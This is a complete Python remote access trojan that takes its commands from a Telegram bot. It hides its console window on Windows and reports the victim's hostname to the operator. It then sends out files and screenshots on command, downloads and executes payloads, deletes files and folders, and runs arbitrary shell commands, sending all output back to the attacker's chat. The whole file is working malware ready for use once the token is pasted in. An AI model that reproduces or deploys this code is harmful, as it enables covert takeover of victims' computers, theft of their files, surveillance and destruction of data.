import requests
import time
import subprocess
import os
import shutil
import pyautogui
import platform
import socket

if platform.system() == "Windows":
    import ctypes
    def hide_window():
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            ctypes.windll.kernel32.FreeConsole()
        except:
            pass
    hide_window()

BOT_TOKEN = 'PAST_THE_TELEGRAM_BOT-API-TOKEN'
CHAT_ID = 'PAST_CHAT_ID-TELEGRAM'
API_URL = f'https://api.telegram.org/bot{BOT_TOKEN}'
FILE_URL = f'https://api.telegram.org/file/bot{BOT_TOKEN}/'

CLOSE_FILE = "last_close_id.txt"

def get_last_close():
    try:
        with open(CLOSE_FILE, "r") as f:
            return int(f.read().strip())
    except:
        return 0

def set_last_close(uid):
    try:
        with open(CLOSE_FILE, "w") as f:
            f.write(str(uid))
    except:
        pass

LAST_UPDATE_ID = get_last_close()
CURRENT_DIR = os.getcwd()
COMMAND_COUNT = 0
SESSION_ACTIVE = True

def send_status(msg):
    try:
        requests.post(f"{API_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
    except:
        pass

def get_commands():
    global LAST_UPDATE_ID
    try:
        r = requests.get(f"{API_URL}/getUpdates?offset={LAST_UPDATE_ID + 1}")
        data = r.json()
        if data["ok"]:
            for upd in data["result"]:
                LAST_UPDATE_ID = upd["update_id"]
                msg = upd["message"]
                if str(msg["chat"]["id"]) == CHAT_ID:
                    return msg, upd["update_id"]
    except:
        pass
    return None, None

def send_output(output):
    try:
        if not output:
            output = "✅ Done."
        if len(output) > 4000:
            for i in range(0, len(output), 4000):
                requests.post(f"{API_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": output[i:i+4000]})
        else:
            requests.post(f"{API_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": output})
    except:
        pass

def send_file(file_path):
    try:
        with open(file_path, "rb") as f:
            requests.post(f"{API_URL}/sendDocument", data={"chat_id": CHAT_ID}, files={"document": f})
    except:
        send_output("❌ Failed to send file.")

def download_file(file_id, save_as):
    try:
        get_path = requests.get(f"{API_URL}/getFile?file_id={file_id}")
        file_path = get_path.json()['result']['file_path']
        content = requests.get(f"{FILE_URL}{file_path}")
        with open(save_as, "wb") as f:
            f.write(content.content)
        return True
    except:
        return False

def run_command(cmd, uid, msg):
    global CURRENT_DIR, COMMAND_COUNT, SESSION_ACTIVE

    try:
        c = cmd.strip()

        if c.lower() == "close":
            if uid <= get_last_close():
                return "⚠️ Ignored duplicate close."
            set_last_close(uid)
            SESSION_ACTIVE = False
            return "❌ Agent closed."

        if c == "--help":
            COMMAND_COUNT += 1
            return f"""🤖 Agent Help (Platform: {platform.system()})

📁 Files:
- grab "<file>"        → Send file
- type "<file.txt>"    → Read text
- upload <file>        → Upload from bot
- exec <file>          → Execute file
- del "<target>"       → Delete file/folder

📂 System:
- cd <path>            → Change directory
- dir / ls             → List directory
- screenshot           → Take screenshot

🧠 Agent:
- --help               → Show help
- commands             → Show count
- close                → Stop agent
"""

        if c == "commands":
            COMMAND_COUNT += 1
            return f"✅ Commands run: {COMMAND_COUNT}"

        if c.lower().startswith("cd "):
            p = c[3:].strip('" ')
            new = os.path.abspath(os.path.join(CURRENT_DIR, p))
            if os.path.isdir(new):
                CURRENT_DIR = new
                COMMAND_COUNT += 1
                return f"📂 Changed to: {CURRENT_DIR}"
            else:
                return "❌ Directory not found."

        if c.lower().startswith("grab "):
            fpath = os.path.join(CURRENT_DIR, c[5:].strip('" '))
            if os.path.isfile(fpath):
                send_file(fpath)
                COMMAND_COUNT += 1
                return f"📤 Sent: {fpath}"
            else:
                return "❌ File not found."

        if c.lower().startswith("type "):
            fpath = os.path.join(CURRENT_DIR, c[5:].strip('" '))
            if os.path.isfile(fpath):
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    COMMAND_COUNT += 1
                    return f.read()
            else:
                return "❌ File not found."

        if c.lower().startswith("upload "):
            fname = c.split(" ", 1)[1].strip('" ')
            if "document" in msg:
                fid = msg["document"]["file_id"]
                ok = download_file(fid, fname)
                if ok:
                    COMMAND_COUNT += 1
                    return f"✅ Uploaded: {fname}"
                else:
                    return "❌ Failed to download."
            else:
                return "⚠️ Send file with caption: upload <filename>"

        if c.lower().startswith("exec "):
            fname = c.split(" ", 1)[1].strip('" ')
            path = os.path.join(CURRENT_DIR, fname)
            if os.path.exists(path):
                subprocess.Popen(path, shell=True, cwd=CURRENT_DIR)
                COMMAND_COUNT += 1
                return f"⚙️ Executed: {fname}"
            else:
                return "❌ File not found."

        if c.lower().startswith("del "):
            target = os.path.join(CURRENT_DIR, c[4:].strip('" '))
            if os.path.exists(target):
                try:
                    if os.path.isfile(target):
                        os.remove(target)
                        COMMAND_COUNT += 1
                        return f"🗑️ Deleted file: {target}"
                    elif os.path.isdir(target):
                        shutil.rmtree(target)
                        COMMAND_COUNT += 1
                        return f"🗑️ Deleted folder: {target}"
                except Exception as e:
                    return f"❌ Delete failed: {str(e)}"
            else:
                return "❌ Not found."

        if c.lower() == "screenshot":
            shot = os.path.join(CURRENT_DIR, "screen.png")
            try:
                pyautogui.screenshot(shot)
                send_file(shot)
                os.remove(shot)
                COMMAND_COUNT += 1
                return "📸 Screenshot sent."
            except:
                return "❌ Screenshot failed."

        result = subprocess.check_output(c, cwd=CURRENT_DIR, shell=True, stderr=subprocess.STDOUT, text=True)
        COMMAND_COUNT += 1
        return result

    except subprocess.CalledProcessError as e:
        return e.output
    except Exception as e:
        return f"❌ Error: {str(e)}"

# Start message
send_status(f"📡 Agent started on: {socket.gethostname()} ({platform.system()})")

while SESSION_ACTIVE:
    msg, uid = get_commands()
    if msg:
        output = run_command(msg["text"], uid, msg)
        send_output(output)
    time.sleep(2)
